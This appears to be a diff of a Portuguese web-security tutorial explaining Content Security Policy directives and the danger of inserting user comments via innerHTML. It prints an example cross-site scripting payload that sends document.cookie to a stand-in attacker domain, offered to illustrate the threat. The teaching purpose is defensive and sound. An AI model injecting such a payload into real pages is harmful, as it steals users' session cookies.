@@ -41,17 +41,17 @@
 
     #ul
       #li
-      #code default-src 'self'
-      #_ : Por padrão, todos os recursos devem vir do próprio servidor do domínio.
+        #code default-src 'self'
+        #_ : Por padrão, todos os recursos devem vir do próprio servidor do domínio.
       #li 
-      #code style-src
-      #_ : As folhas de estilo (por exemplo, arquivos CSS) devem vir do servidor do domínio ou dos domínios especificados.
+        #code style-src
+        #_ : As folhas de estilo (por exemplo, arquivos CSS) devem vir do servidor do domínio ou dos domínios especificados.
       #li
-      #code script-src
-      #_ : Os arquivos de script (por exemplo, arquivos JS) devem vir do servidor do domínio ou dos domínios especificados.
+        #code script-src
+        #_ : Os arquivos de script (por exemplo, arquivos JS) devem vir do servidor do domínio ou dos domínios especificados.
       #li
-      #code font-src
-      #_ : As fontes devem vir do servidor do domínio ou dos domínios especificados.
+        #code font-src
+        #_ : As fontes devem vir do servidor do domínio ou dos domínios especificados.
 
     #p Qualquer recurso não especificado aqui se enquadra na regra default-src.
 
@@ -77,7 +77,7 @@
 
     #p E se o conteúdo do comentário for:
 
-    #js-code
+    #gray-code
       #< <script>fetch('https://attackerDomain5050.com?c=' + document.cookie)</script>
 
     #p Neste caso, qualquer usuário que acessar uma página com esse comentário corre o risco de ter seus cookies roubados. Como o conteúdo é inserido via innerHTML, o navegador o interpreta como código do front-end executável. Este é apenas um exemplo de muitas ameaças possíveis.
